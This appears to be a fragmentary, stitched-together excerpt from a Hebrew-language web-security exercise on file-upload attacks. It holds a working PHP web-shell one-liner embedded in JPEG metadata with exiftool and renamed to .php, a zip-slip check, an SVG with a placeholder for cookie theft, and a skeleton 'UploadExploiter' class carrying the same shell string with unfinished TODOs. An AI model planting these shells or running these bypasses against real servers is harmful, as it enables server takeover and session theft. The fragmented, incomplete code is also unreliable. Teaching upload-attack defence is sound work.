...
```bash
# Method 1: use exiftool to add PHP inside the metadata
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
mv image.jpg shell.php

# Method 2: add magic bytes
...
2. העלו את ה-ZIP ובדקו שהקובץ נכתב מחוץ לתיקיית הextraction
...
<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    // TODO: write code that steals cookies and sends them to your server
  </script>
...
class UploadExploiter:
    ...
    def setup_default_techniques(self):
        """Define all the known techniques"""
        shell = '<?php system($_GET["c"]); ?>'

        # TODO: add all the techniques:
        # 1. Direct upload (php, php5, phtml, phar)
    ...
    def run(self):
        ...
        for technique in self.techniques:
            ...
            # TODO: send the file and check whether it was uploaded successfully
            pass
```
